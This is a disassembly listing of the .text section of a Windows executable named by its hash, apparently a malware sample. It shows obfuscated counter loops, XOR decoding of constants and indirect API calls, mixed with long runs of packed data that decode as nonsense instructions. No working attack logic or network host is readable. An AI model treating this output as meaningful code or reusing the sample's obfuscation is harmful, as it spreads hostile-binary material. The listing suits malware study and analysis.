
f265dab49305dc35fd6a7bc050528092ef5b758fdec0de3632075f6b999b7235.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	adc    ecx,0x4d2f
  40100a:	add    BYTE PTR [eax],al
  40100c:	add    al,BYTE PTR [eax]
  40100e:	add    BYTE PTR [eax],al
  401010:	cmp    al,BYTE PTR [eax]
  401012:	add    BYTE PTR [eax],al
  401014:	add    BYTE PTR [eax],al
  401016:	add    DWORD PTR [eax],eax
  401018:	add    BYTE PTR [edx-0x74ab0000],bh
  40101e:	in     al,dx
  40101f:	sub    esp,0x30
  401022:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  401029:	mov    eax,ds:0x44d414
  40102e:	adc    eax,DWORD PTR ds:0x44d428
  401034:	mov    ds:0x44d414,eax
  401039:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  401040:	xor    ecx,0x17d8
  401046:	mov    ecx,DWORD PTR [ebp-0x4]
  401049:	push   ebx
  40104a:	and    DWORD PTR ds:0x447994,0x0
  401054:	xor    eax,eax
  401056:	add    eax,DWORD PTR ds:0x447994
  40105c:	inc    eax
  40105d:	mov    ds:0x447994,eax
  401062:	cmp    DWORD PTR ds:0x447994,0xa
  401069:	jne    0x40108c
  40106f:	push   DWORD PTR [ebp-0x10]
  401072:	push   DWORD PTR [ebp-0x28]
  401075:	push   DWORD PTR [ebp-0x20]
  401078:	push   0x74f6
  40107d:	push   DWORD PTR [ebp-0x24]
  401080:	push   DWORD PTR [ebp-0x28]
  401083:	push   DWORD PTR [ebp-0x20]
  401086:	call   DWORD PTR ds:0x4420c4
  40108c:	cmp    DWORD PTR ds:0x447994,0x9
  401093:	jne    0x4010a4
  401099:	mov    eax,ds:0x447994
  40109e:	inc    eax
  40109f:	mov    ds:0x447994,eax
  4010a4:	cmp    DWORD PTR ds:0x447994,0x17
  4010ab:	jb     0x401054
  4010b1:	add    DWORD PTR ds:0x447980,ecx
  4010b7:	mov    eax,0x7510857
  4010bc:	xor    ecx,eax
  4010be:	xor    DWORD PTR ds:0x44a6dc,0x226
  4010c8:	mov    ebx,0x32729e
  4010cd:	not    DWORD PTR ds:0x44a6e0
  4010d3:	jmp    0x4011a6
  4010d8:	dec    esi
  4010d9:	dec    edx
  4010da:	xor    al,0x5c
  4010dc:	fcom   DWORD PTR [edx+0x66]
  4010df:	jp     0x4010bd
  4010e1:	test   DWORD PTR [ebx+0x58],0xe6219ca4
  4010e8:	jl     0x401166
  4010ea:	jl     0x401168
  4010ec:	mov    ds:0xcc7c7c7c,al
  4010f1:	(bad)  
  4010f2:	xor    ecx,ebx
  4010f4:	xor    eax,0xcaddcfdb
  4010f9:	ja     0x401171
  4010fb:	or     ecx,DWORD PTR [edi]
  4010fd:	loope  0x401109
  4010ff:	(bad)  
  401101:	bswap  edx
  401103:	adc    dh,BYTE PTR [edi]
  401105:	sbb    bl,BYTE PTR [edi]
  401107:	mov    ch,0x52
  401109:	or     ah,BYTE PTR [edi-0x4e10f32f]
  40110f:	rol    esp,cl
  401111:	or     ecx,DWORD PTR [esp+edx*1+0x4da8e6bc]
  401118:	sbb    DWORD PTR [ecx+0x541fb4dc],esp
  40111e:	out    dx,al
  40111f:	outs   dx,DWORD PTR ds:[esi]
  401120:	add    ebx,DWORD PTR ds:0x4ac4729e
  401126:	mov    al,ds:0x36dd215b
  40112b:	mov    eax,ds:0xa3c97380
  401131:	je     0x401169
  401133:	fisttp DWORD PTR [ebp+0x359ac4f5]
  401139:	jecxz  0x401175
  40113b:	and    ebp,0x4f
  40113e:	aam    0x94
  401140:	dec    ebp
  401141:	inc    DWORD PTR [edi-0x2f5a886e]
  401147:	mov    cl,0x41
  401149:	loope  0x40116f
  40114b:	pop    ecx
  40114c:	sub    edi,DWORD PTR [eax-0x41639320]
  401152:	jae    0x401171
  401154:	retf   
  401155:	cwde   
  401156:	sub    eax,0xc85ce3c6
  40115b:	(bad)  
  40115c:	mov    dl,0xfa
  40115e:	loopne 0x4010f8
  401160:	cmp    eax,0xc76966cf
  401165:	sub    al,cl
  401167:	or     ch,dl
  401169:	sbb    eax,0xb39945d
  40116e:	outs   dx,DWORD PTR ds:[esi]
  40116f:	ins    DWORD PTR es:[edi],dx
  401170:	jb     0x401174
  401172:	cmp    eax,0x22468cd1
  401177:	jns    0x4011f8
  401179:	cmp    al,0x8f
  40117b:	add    bl,dl
  40117d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40117e:	add    edx,DWORD PTR [ebx+0x59]
  401181:	rol    esp,1
  401183:	add    eax,0x15d55edb
  401188:	jge    0x401126
  40118a:	mov    ah,0x43
  40118c:	daa    
  40118d:	sbb    DWORD PTR [ebx],esp
  40118f:	addr16 and eax,0x4f3cdb10
  401195:	loop   0x401158
  401197:	xchg   esi,eax
  401198:	(bad)  
  401199:	push   ss
  40119a:	addr16 mov bh,0x35
  40119d:	sbb    BYTE PTR gs:[edi+eax*8+0x29],bh
  4011a2:	test   BYTE PTR [eax+0x70],dl
  4011a5:	or     DWORD PTR [ebx],eax
  4011a7:	retf   
  4011a8:	adc    DWORD PTR ds:0x424859,0x44d418
  4011b2:	mov    DWORD PTR [ebp-0x1c],ecx
  4011b5:	xor    DWORD PTR ds:0x41074f,0x5a6f
  4011bf:	mov    ecx,DWORD PTR [ebp+0x14]
  4011c2:	adc    DWORD PTR ds:0x44d414,0x424855
  4011cc:	jmp    0x40129f
  4011d1:	inc    edi
  4011d2:	in     eax,0x24
  4011d4:	xor    bh,BYTE PTR [edx+0x6b7d7dcd]
  4011da:	inc    ebp
  4011db:	in     al,dx
  4011dc:	xchg   BYTE PTR [ebp+0x74],dl
  4011df:	aas    
  4011e0:	sub    esp,DWORD PTR [edx-0x5d838384]
  4011e6:	jl     0x401264
  4011e8:	jl     0x4011bb
  4011ea:	aaa    
  4011eb:	retf   
  4011ec:	xchg   ebx,eax
  4011ed:	mov    ah,0x1e
  4011ef:	mov    ecx,0x94f6d828
  4011f4:	stos   BYTE PTR es:[edi],al
  4011f5:	adc    cl,ch
  4011f7:	dec    ebx
  4011f8:	xchg   edx,eax
  4011f9:	ret    0xad4e
  4011fc:	outs   dx,DWORD PTR ds:[esi]
  4011fd:	mov    eax,ds:0x5a94328
  401202:	in     eax,dx
  401203:	fcomp  QWORD PTR [esi-0x5c]
  401206:	sub    BYTE PTR [ecx-0x36],bh
  401209:	call   0x6317:0x214675fd
  401210:	mov    eax,0x63217f86
  401215:	mov    dl,0x77
  401217:	cmc    
  401218:	inc    eax
  401219:	sub    ecx,edx
  40121b:	(bad)  
  40121c:	and    esi,ebx
  40121e:	test   al,0x79
  401220:	mov    BYTE PTR [ebp+0x68a0edd8],bl
  401226:	fs dec edi
  401228:	ins    BYTE PTR es:[edi],dx
  401229:	jns    0x401202
  40122b:	jnp    0x4011b2
  40122d:	and    dl,BYTE PTR [edi+esi*8+0xf710b44]
  401234:	ret    
  401235:	or     al,0xa
  401237:	push   eax
  401238:	popa   
  401239:	pop    eax
  40123a:	xor    bl,BYTE PTR [eax+0x7]
  40123d:	(bad)  
  40123e:	mov    DWORD PTR [edx+edi*1-0x6c5775dd],edi
  401245:	inc    edi
  401246:	ins    DWORD PTR es:[edi],dx
  401247:	push   cs
  401248:	pop    edi
  401249:	(bad)  
  40124a:	mov    ds:0xa4bc798d,eax
  40124f:	and    DWORD PTR [esi],ecx
  401251:	aam    0x1d
  401253:	push   ss
  401254:	add    ebp,DWORD PTR [eax-0x8]
  401257:	pushf  
  401258:	cmp    dh,BYTE PTR [eax-0x2d]
  40125b:	add    esp,ebp
  40125d:	cmp    DWORD PTR [ecx-0x5c],0x720d8955
  401264:	inc    ebp
  401265:	sbb    BYTE PTR [ebp-0x2f],0x26
  401269:	cmp    ecx,DWORD PTR [esi]
  40126b:	push   ss
  40126c:	in     al,dx
  40126d:	add    al,0x35
  40126f:	daa    
  401270:	test   bh,dh
  401272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401273:	cld    
  401274:	test   al,0xd4
  401276:	aaa    
  401277:	inc    esp
  401278:	je     0x4012e7
  40127a:	dec    esi
  40127b:	dec    esi
  40127c:	sar    DWORD PTR [ebp-0x1e],0xd2
  401280:	jnp    0x4012dd
  401282:	leave  
  401283:	push   0x91b77810
  401288:	mov    BYTE PTR ds:0x50a53df7,dh
  40128e:	dec    esi
  40128f:	fidivr WORD PTR [esi]
  401291:	mov    esp,0x1b5173a8
  401296:	enter  0xa4ec,0x95
  40129a:	xor    edi,edi
  40129c:	mov    esp,0x57564e6b
  4012a1:	test   ecx,ecx
  4012a3:	mov    DWORD PTR ds:0x42485d,0x53ab
  4012ad:	je     0x401398
  4012b3:	and    ecx,ecx
  4012b5:	mov    ecx,DWORD PTR [ebp+0x14]
  4012b8:	and    edi,edi
  4012ba:	jmp    0x40138d
  4012bf:	xchg   DWORD PTR [edi-0x31],eax
  4012c2:	or     ecx,edi
  4012c4:	mov    ebx,DWORD PTR [ebx+0x5b]
  4012c7:	dec    esi
  4012c8:	popa   
  4012c9:	enter  0xe3fc,0xe8
  4012cd:	mov    ebx,0x7c7fe86a
  4012d2:	jl     0x401276
  4012d4:	jl     0x401352
  4012d6:	jl     0x40126f
  4012d8:	xor    al,0x50
  4012da:	fsub   DWORD PTR [ebp+0x229eb736]
  4012e0:	xor    ch,0x9b
  4012e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012e4:	cdq    
  4012e5:	jno    0x40135f
  4012e7:	clc    
  4012e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012e9:	mul    DWORD PTR [ebp-0x72]
  4012ec:	imul   ebx,edx,0xffffff81
  4012ef:	pop    edi
  4012f0:	mov    al,0xc1
  4012f2:	cmp    eax,0x75942fc4
  4012f7:	jns    0x40129c
  4012f9:	daa    
  4012fa:	arpl   WORD PTR [esi],di
  4012fc:	xchg   DWORD PTR [esi],esi
  4012fe:	(bad)  
  4012ff:	and    al,0xf8
  401301:	in     al,dx
  401302:	inc    eax
  401303:	jno    0x40131f
  401305:	add    bl,BYTE PTR [ebx]
  401307:	pop    edi
  401308:	and    al,0x86
  40130a:	neg    BYTE PTR [edi+0x630a4b37]
  401310:	jbe    0x4012e1
  401312:	sbb    BYTE PTR [ebp+0x45],al
  401315:	dec    esi
  401316:	cld    
  401317:	ins    DWORD PTR es:[edi],dx
  401318:	mov    al,0xb1
  40131a:	xchg   edi,eax
  40131b:	mov    DWORD PTR [ebp-0x29],0x74d76851
  401322:	inc    esp
  401323:	dec    edx
  401324:	mov    esp,0x5359687a
  401329:	imul   eax,DWORD PTR [esi+ecx*4],0xb7a5a6c9
  401330:	sahf   
  401331:	imul   DWORD PTR [edi+ebp*4-0x17b05acc]
  401338:	ror    DWORD PTR [edi+0x0],1
  40133b:	mov    ebx,0xb4029154
  401340:	inc    esi
  401341:	inc    esi
  401342:	lahf   
  401343:	inc    esp
  401344:	lock outs dx,BYTE PTR ds:[esi]
  401346:	cdq    
  401347:	inc    edx
  401348:	mov    al,ds:0x79620f69
  40134d:	inc    eax
  40134e:	inc    ecx
  40134f:	dec    ebp
  401350:	xchg   ebx,eax
  401351:	fsub   DWORD PTR [ebp-0x3b]
  401354:	jno    0x4013c7
  401356:	retf   
  401357:	sbb    eax,0xcc74198c
  40135c:	pop    ecx
  40135d:	add    edx,DWORD PTR [eax]
  40135f:	pop    ebx
  401360:	clc    
  401361:	jae    0x401330
  401363:	popf   
  401364:	jge    0x40139b
  401366:	adc    eax,0x3f52289e
  40136b:	int3   
  40136c:	jmp    0x171c:0x56fcd409
  401373:	out    0xac,al
  401375:	mov    ch,0x13
  401377:	pop    ebp
  401378:	mov    ah,0x15
  40137b:	or     ecx,DWORD PTR [edx-0x7b]
  40137e:	dec    DWORD PTR [edx-0x16]
  401381:	sub    BYTE PTR [edx+0x61],0x4b
  401385:	inc    esp
  401386:	ret    0xc2be
  401389:	xchg   edx,eax
  40138a:	cmp    eax,0x98b7d57
  40138f:	sub    DWORD PTR ds:0x41074f,ebx
  401395:	mov    DWORD PTR [ebp-0x1c],ecx
  401398:	sbb    esi,ecx
  40139a:	imul   edx,eax
  40139d:	and    DWORD PTR ds:0x424855,0x618e
  4013a7:	mov    ecx,0x4573
  4013ac:	mov    DWORD PTR ds:0x44a6d8,0x19
  4013b6:	cmp    DWORD PTR ds:0x44a6d8,0x0
  4013bd:	je     0x4013f3
  4013c3:	cmp    DWORD PTR ds:0x44a6d8,0x1a
  4013ca:	jne    0x4013d9
  4013d0:	push   DWORD PTR [ebp-0x1c]
  4013d3:	call   DWORD PTR ds:0x442338
  4013d9:	xor    edi,edi
  4013db:	or     edi,DWORD PTR ds:0x44a6d8
  4013e1:	dec    edi
  4013e2:	mov    DWORD PTR ds:0x44a6d8,edi
  4013e8:	jmp    0x4013b6
  4013ed:	xor    DWORD PTR ds:0x447980,edx
  4013f3:	add    edx,ecx
  4013f5:	inc    edi
  4013f6:	mov    esi,0x7879
  4013fb:	add    DWORD PTR ds:0x44a6e8,edx
  401401:	mov    edi,0x1556
  401406:	sub    DWORD PTR ds:0x4479a4,0x41074b
  401410:	xchg   esi,ecx
  401412:	xor    DWORD PTR ds:0x44d420,ecx
  401418:	sub    edx,edi
  40141a:	or     ecx,0x50d4
  401420:	xor    esi,esi
  401422:	mov    DWORD PTR [ebp-0x28],esi
  401425:	movzx  ecx,WORD PTR ds:0x44d420
  40142c:	xor    DWORD PTR ds:0x44d414,ecx
  401432:	mov    DWORD PTR [ebp-0x2c],esi
  401435:	or     ecx,0x6619
  40143b:	mov    DWORD PTR [ebp-0x14],esi
  40143e:	mov    ecx,DWORD PTR ds:0x410757
  401444:	xor    DWORD PTR ds:0x42484d,ecx
  40144a:	jmp    0x40151d
  40144f:	ficom  WORD PTR [esi+0x7b7d5fa5]
  401455:	loop   0x401400
  401457:	sbb    al,0x21
  401459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40145a:	out    dx,eax
  40145b:	jb     0x401462
  40145d:	out    dx,eax
  40145e:	pop    es
  40145f:	push   ds
  401460:	jle    0x4014de
  401462:	jl     0x401406
  401464:	jl     0x4014e2
  401466:	jl     0x4014dd
  401468:	lds    edx,FWORD PTR [ecx+edi*2+0x4dea6f64]
  40146f:	pop    edi
  401470:	xchg   ecx,eax
  401471:	push   ebp
  401472:	cmp    DWORD PTR [ebp+edx*1-0x1f],ebp
  401476:	pop    eax
  401477:	mov    edi,DWORD PTR [ebp+0x48]
  40147a:	push   esi
  40147b:	fbstp  TBYTE PTR [eax+eax*1]
  40147e:	clc    
  40147f:	sbb    BYTE PTR [eax+esi*2-0x3f],ah
  401483:	add    DWORD PTR [eax-0x712acff8],0x6f
  40148a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40148b:	and    esp,ebx
  40148d:	cwd    
  40148f:	cs test al,0x58
  401492:	in     al,0xe8
  401494:	sub    DWORD PTR [ebx+0x20],esi
  401497:	stc    
  401498:	mov    WORD PTR [esi],?
  40149a:	loope  0x401452
  40149c:	dec    ebx
  40149d:	cmp    BYTE PTR [ebx],dl
  40149f:	stc    
  4014a0:	cmp    edi,eax
  4014a2:	xor    cl,ah
  4014a4:	xchg   DWORD PTR [eax],esi
  4014a6:	sbb    DWORD PTR [eax-0x2d],eax
  4014a9:	pop    esi
  4014aa:	fisttp QWORD PTR [esi-0x302d1c18]
  4014b0:	cs mov bl,0x2e
  4014b3:	in     eax,dx
  4014b4:	mov    al,ds:0xbc48afe6
  4014b9:	pop    edx
  4014ba:	ds out 0x94,eax
  4014bd:	mov    edi,0x8286f70e
  4014c2:	adc    BYTE PTR [ecx+0x78],dl
  4014c5:	mov    gs,WORD PTR [ecx*4-0x38ffabb9]
  4014cc:	xor    esi,DWORD PTR [edi]
  4014ce:	aas    
  4014cf:	jl     0x40153e
  4014d1:	xor    BYTE PTR fs:[ebx],al
  4014d4:	adc    DWORD PTR [esi-0x1dec3996],eax
  4014da:	inc    ebp
  4014dc:	imul   esp,esp,0xffffffff
  4014df:	cmp    eax,0x4dae7e88
  4014e4:	adc    ecx,esi
  4014e6:	pop    ebx
  4014e7:	pop    ss
  4014e8:	xchg   DWORD PTR [edi+0x36],ebp
  4014eb:	sbb    eax,0xeab52a31
  4014f0:	retf   
  4014f1:	fidiv  DWORD PTR [ebp-0x6c11942a]
  4014f7:	cmp    ebp,ebx
  4014f9:	hlt    
  4014fa:	cmp    DWORD PTR [eax+0x768cf7ac],ebp
  401500:	xor    al,0xe6
  401502:	jmp    0x4014d0
  401504:	xchg   ecx,eax
  401505:	test   DWORD PTR [ebx],edi
  401507:	pop    esi
  401508:	add    si,WORD PTR [eax-0x71824c66]
  40150f:	int    0x96
  401511:	push   ss
  401512:	dec    edx
  401513:	mov    dl,0x5d
  401515:	dec    esi
  401516:	jb     0x4014a0
  401518:	ins    DWORD PTR es:[edi],dx
  401519:	les    esp,FWORD PTR [edx+0xd]
  40151c:	push   eax
  40151d:	mov    DWORD PTR [ebp-0x8],esi
  401520:	jmp    0x4015f3
  401525:	add    DWORD PTR [eax],edi
  401527:	repz push esp
  401529:	lods   eax,DWORD PTR ds:[esi]
  40152a:	addr16 std 
  40152c:	jge    0x401526
  40152e:	stc    
  40152f:	icebp  
  401530:	sahf   
  401531:	in     al,dx
  401532:	mov    esi,0x7e445397
  401537:	jl     0x4015b5
  401539:	mov    ds:0xba7c7c7c,al
  40153e:	stc    
  40153f:	or     bh,BYTE PTR ds:[edi+eiz*2-0x1b]
  401544:	push   esp
  401545:	xor    edi,esi
  401547:	arpl   WORD PTR [ecx+0x46],bp
  40154a:	fwait
  40154b:	aam    0x6f
  40154d:	adc    eax,0xb0128de2
  401552:	(bad)  
  401553:	or     BYTE PTR ds:0x8626c1ab,dh
  401559:	popa   
  40155a:	and    BYTE PTR [ebx-0x6b],ch
  40155d:	loop   0x40150b
  40155f:	sbb    DWORD PTR [ebp-0x70220454],edi
  401565:	mov    esi,0xdf3806c8
  40156a:	hlt    
  40156b:	repz (bad) 
  40156d:	push   ebx
  40156e:	and    BYTE PTR ds:0xd5e58f64,bh
  401574:	inc    ebp
  401575:	js     0x4015ca
  401577:	mov    dh,0xd6
  401579:	pusha  
  40157a:	xchg   DWORD PTR [edx],eax
  40157c:	(bad)  
  40157d:	sbb    DWORD PTR [edx],ecx
  40157f:	addr16 int 0xe0
  401582:	test   eax,0x81ebb2af
  401587:	pop    ebx
  401588:	ficomp WORD PTR [ecx-0x78a6701b]
  40158e:	mov    dl,0xba
  401590:	jge    0x40160c
  401592:	mov    al,ds:0x2a0402b0
  401597:	ss aaa 
  401599:	cwde   
  40159a:	or     eax,0x75c0fed1
  40159f:	add    eax,0x922f0d8e
  4015a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015a5:	cld    
  4015a6:	inc    esi
  4015a7:	sub    ecx,ebp
  4015a9:	into   
  4015aa:	in     al,dx
  4015ab:	xchg   edx,eax
  4015ac:	or     al,0x1a
  4015ae:	inc    ecx
  4015af:	jl     0x401534
  4015b1:	mov    esp,0x65ae228b
  4015b6:	inc    esp
  4015b7:	pop    ecx
  4015b8:	add    eax,0x704ceb54
  4015bd:	fnstsw WORD PTR [eax]
  4015bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015c0:	outs   dx,BYTE PTR ds:[esi]
  4015c1:	(bad)  
  4015c2:	out    dx,eax
  4015c3:	and    DWORD PTR [ebx+0x4c],eax
  4015c6:	int    0x75
  4015c8:	std    
  4015c9:	inc    ecx
  4015ca:	xchg   ebx,eax
  4015cb:	or     eax,0x29a6f30f
  4015d0:	or     ecx,DWORD PTR [eax]
  4015d2:	jne    0x40160d
  4015d4:	ret    0x8126
  4015d7:	popf   
  4015d8:	mov    dl,cl
  4015da:	mov    cl,0xcb
  4015dc:	xor    ch,bl
  4015de:	(bad)  [edx-0x7139d7ba]
  4015e4:	jmp    FWORD PTR [esi-0x65]
  4015e7:	mov    es,WORD PTR [ebp+0x60]
  4015ea:	int    0xc
  4015ec:	pop    eax
  4015ed:	cli    
  4015ee:	mov    edx,0x925bb4e5
  4015f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4015f6:	sbb    DWORD PTR ds:0x410743,0x410747
  401600:	xor    ecx,eax
  401602:	mov    DWORD PTR ds:0x41074b,0x13
  40160c:	cmp    DWORD PTR ds:0x41074b,0x0
  401613:	je     0x401657
  401619:	cmp    DWORD PTR ds:0x41074b,0x2
  401620:	jne    0x40162f
  401626:	push   DWORD PTR [ebp-0xc]
  401629:	call   DWORD PTR ds:0x44233c
  40162f:	cmp    DWORD PTR ds:0x41074b,0x3
  401636:	jne    0x401647
  40163c:	mov    eax,ds:0x41074b
  401641:	dec    eax
  401642:	mov    ds:0x41074b,eax
  401647:	mov    eax,ds:0x41074b
  40164c:	dec    eax
  40164d:	mov    ds:0x41074b,eax
  401652:	jmp    0x40160c
  401657:	xor    edi,edi
  401659:	add    ecx,ebx
  40165b:	mov    eax,ds:0x424861
  401660:	mov    DWORD PTR [ebp-0x20],ecx
  401663:	mov    eax,DWORD PTR [ebp-0x20]
  401666:	mov    DWORD PTR ds:0x410747,0x348
  401670:	je     0x402298
  401676:	mov    eax,DWORD PTR [ebp-0x4]
  401679:	xor    DWORD PTR ds:0x44a6d8,0x44d410
  401683:	xor    eax,0x7510857
  401688:	jmp    0x40175b
  40168d:	in     eax,0x57
  40168f:	iret   
  401690:	call   0x2571:0x577dba5d
  401697:	mov    esi,0x444e086a
  40169c:	pusha  
  40169d:	mov    dh,BYTE PTR [ecx+0x7c]
  4016a0:	jl     0x401644
  4016a2:	jl     0x401720
  4016a4:	jl     0x4016d2
  4016a6:	inc    esi
  4016a7:	sub    DWORD PTR [ebx+ecx*4+0x5b9d1e26],esp
  4016ae:	and    dh,dl
  4016b0:	fs pop edx
  4016b2:	pop    eax
  4016b4:	lea    ecx,[edx+ebp*2-0x22]
  4016b8:	pop    ebp
  4016b9:	mov    bl,0xfa
  4016bb:	cmp    BYTE PTR [eax+ebp*8-0x7e],0xa
  4016c0:	in     al,0xdf
  4016c2:	mov    ds:0x59da5e7d,al
  4016c7:	(bad)  
  4016c8:	push   0x1dff7f14
  4016cd:	or     edx,esp
  4016cf:	push   edi
  4016d0:	pop    ebx
  4016d1:	mov    al,0xfd
  4016d3:	mov    esp,0xd0e99c6a
  4016d8:	dec    dh
  4016da:	jbe    0x4016aa
  4016dc:	pop    ebp
  4016dd:	dec    ebp
  4016de:	jg     0x40171b
  4016e0:	es push ebx
  4016e2:	mov    edi,0xab50de6f
  4016e7:	dec    esi
  4016e8:	loope  0x4016a4
  4016ea:	and    dl,bl
  4016ec:	push   ds
  4016ed:	in     al,0x6b
  4016ef:	inc    ecx
  4016f0:	pop    ecx
  4016f1:	bound  esp,QWORD PTR [edx-0x6a2c7879]
  4016f7:	jbe    0x40172d
  4016f9:	add    DWORD PTR [ebp+edi*4+0x3a61e75f],ebx
  401700:	sbb    edi,DWORD PTR [edx+0x52]
  401703:	xchg   ecx,eax
  401704:	xlat   BYTE PTR ds:[ebx]
  401705:	mov    eax,0xfc94ac8e
  40170a:	jo     0x401723
  40170c:	mov    ecx,0xdbfecb2
  401711:	mov    ebp,0xb781946
  401716:	sahf   
  401717:	fnstcw WORD PTR [ebx+0x273f0395]
  40171d:	les    ecx,FWORD PTR [esi+ebp*2-0x47]
  401721:	outs   dx,BYTE PTR ds:[esi]
  401722:	mov    ebx,0x4eae8026
  401727:	daa    
  401728:	jle    0x4016f4
  40172a:	sbb    ebp,DWORD PTR [edi]
  40172c:	jno    0x401767
  40172e:	out    0xe1,eax
  401730:	mov    ds:0x8ef84955,al
  401735:	mov    ebx,0xcb06624f
  40173a:	in     eax,dx
  40173b:	pushf  
  40173c:	aad    0xb2
  40173e:	pop    ebx
  40173f:	dec    DWORD PTR ds:0xcc72050c
  401745:	sub    al,BYTE PTR [esi]
  401747:	test   eax,0x9ab37b72
  40174c:	or     al,0x7
  40174e:	or     cl,BYTE PTR [eax]
  401750:	dec    esi
  401751:	sbb    esi,DWORD PTR [edx+0x7e27c052]
  401757:	and    DWORD PTR [ebp+0x4b],eax
  40175a:	test   al,0x3
  40175c:	ret    
  40175d:	mov    DWORD PTR ds:0x4479a4,0x156f
  401767:	cmp    edi,eax
  401769:	mov    DWORD PTR ds:0x44d414,0x5e58
  401773:	jne    0x401eef
  401779:	push   DWORD PTR [ebp+0x8]
  40177c:	add    DWORD PTR ds:0x44a6e4,0x4479a0
  401786:	call   0x409b25
  40178b:	mov    DWORD PTR ds:0x44d414,0x72d4
  401795:	mov    DWORD PTR [ebp-0x20],eax
  401798:	and    DWORD PTR ds:0x41073f,0x0
  4017a2:	jmp    0x4017b4
  4017a7:	mov    ecx,DWORD PTR ds:0x41073f
  4017ad:	inc    ecx
  4017ae:	mov    DWORD PTR ds:0x41073f,ecx
  4017b4:	cmp    DWORD PTR ds:0x41073f,0x16
  4017bb:	jae    0x4018af
  4017c1:	cmp    DWORD PTR ds:0x41073f,0x25
  4017c8:	jne    0x4017d7
  4017ce:	push   DWORD PTR [ebp-0x1c]
  4017d1:	call   DWORD PTR ds:0x442340
  4017d7:	jmp    0x4017a7
  4017dc:	jmp    0x4018af
  4017e1:	fdiv   st(2),st
  4017e3:	jmp    0xef7a:0x5462fa52
  4017ea:	into   
  4017eb:	outs   dx,DWORD PTR ds:[esi]
  4017ec:	inc    ecx
  4017ed:	pusha  
  4017ee:	loope  0x4017c0
  4017f0:	jne    0x401822
  4017f2:	jo     0x401870
  4017f4:	jl     0x401798
  4017f6:	jl     0x401874
  4017f8:	jl     0x40179c
  4017fa:	xor    BYTE PTR [ebx-0x22],bl
  4017fd:	xchg   edi,eax
  4017fe:	jecxz  0x4017d5
  401800:	push   ecx
  401801:	xor    al,cl
  401803:	retf   
  401804:	fsub   DWORD PTR [eax+0x1de8e5af]
  40180a:	ret    0x60bf
  40180d:	js     0x401815
  40180f:	cmp    al,0x79
  401811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401812:	xor    eax,0xab574764
  401817:	lock sbb DWORD PTR [ecx-0x535dd0ea],edi
  40181e:	call   0x3bcab2bc
  401823:	mov    dh,0x6d
  401825:	rol    BYTE PTR [edx+0x3ce7f668],1
  40182b:	jl     0x40187d
  40182d:	nop
  40182e:	adc    al,0x2b
  401830:	retf   0x96c4
  401833:	add    DWORD PTR [esi-0x57ab5992],edx
  401839:	xchg   esp,eax
  40183a:	dec    edi
  40183b:	jne    0x40184b
  40183d:	sti    
  40183e:	sbb    bl,cl
  401840:	sub    DWORD PTR [esi],esi
  401842:	pop    ss
  401843:	push   esp
  401844:	les    ecx,FWORD PTR [edi]
  401846:	aad    0x96
  401848:	or     eax,0xaa449557
  40184d:	leave  
  40184e:	jo     0x4017df
  401850:	pushf  
  401851:	loopne 0x4017f2
  401853:	add    edx,DWORD PTR [edi]
  401855:	aad    0x7d
  401857:	adc    eax,0x41c6a784
  40185c:	cmc    
  40185d:	out    0x23,eax
  40185f:	xchg   edx,eax
  401860:	adc    ebx,DWORD PTR [edx-0x162dd061]
  401866:	in     al,0x6b
  401868:	pop    ecx
  401869:	aad    0x2a
  40186b:	nop
  40186c:	mov    dl,0xe0
  40186e:	sub    BYTE PTR [edx-0x66976c63],dh
  401874:	test   BYTE PTR [esi+0x7d3526f8],bl
  40187a:	pop    esi
  40187b:	loop   0x4018d7
  40187d:	test   BYTE PTR ds:0xd070f8d5,0xdd
  401884:	idiv   BYTE PTR [ecx+0x13611fb7]
  40188a:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40188c:	pusha  
  40188d:	iret   
  40188e:	cli    
  40188f:	mov    cl,0x9c
  401891:	in     al,dx
  401892:	adc    al,0xbd
  401894:	and    eax,0x1e211b50
  401899:	pop    es
  40189a:	pop    esp
  40189b:	xchg   DWORD PTR [ebx+0x37fa4258],esi
  4018a1:	xchg   esi,eax
  4018a2:	imul   eax,DWORD PTR [ebp-0x59],0x4b6ed7d
  4018a9:	(bad)  
  4018aa:	mov    ebp,0x45ce77
  4018af:	mov    eax,DWORD PTR [ebp-0x4]
  4018b2:	xor    DWORD PTR ds:0x44d40c,edi
  4018b8:	mov    ecx,DWORD PTR [ebp-0x20]
  4018bb:	adc    DWORD PTR ds:0x44a6d4,ebx
  4018c1:	mov    esi,0x7510857
  4018c6:	xor    eax,esi
  4018c8:	adc    DWORD PTR ds:0x44798c,0x424861
  4018d2:	add    eax,ebx
  4018d4:	mov    DWORD PTR ds:0x447998,0x1172
  4018de:	cmp    ecx,eax
  4018e0:	mov    DWORD PTR ds:0x44799c,0x309e
  4018ea:	je     0x4021a9
  4018f0:	sub    DWORD PTR ds:0x41074b,0x410743
  4018fa:	push   DWORD PTR [ebp-0x20]
  4018fd:	jmp    0x4019d0
  401902:	js     0x40197b
  401904:	dec    ecx
  401905:	mov    bh,BYTE PTR [ebp+0x4a]
  401908:	jnp    0x401903
  40190a:	hlt    
  40190b:	push   esi
  40190c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40190d:	imul   ecx,DWORD PTR [esi+eax*4],0x5e
  401911:	(bad)  
  401912:	data16 jo 0x401991
  401915:	jl     0x4018b9
  401917:	jl     0x401995
  401919:	jl     0x401923
  40191b:	ins    BYTE PTR es:[edi],dx
  40191c:	fcom   DWORD PTR [ebx+0x41]
  40191f:	dec    ebx
  401920:	sub    esp,DWORD PTR [eax-0x47f5062]
  401926:	adc    al,0x1d
  401928:	clc    
  401929:	adc    BYTE PTR [ebp+0x2e],dl
  40192c:	dec    ecx
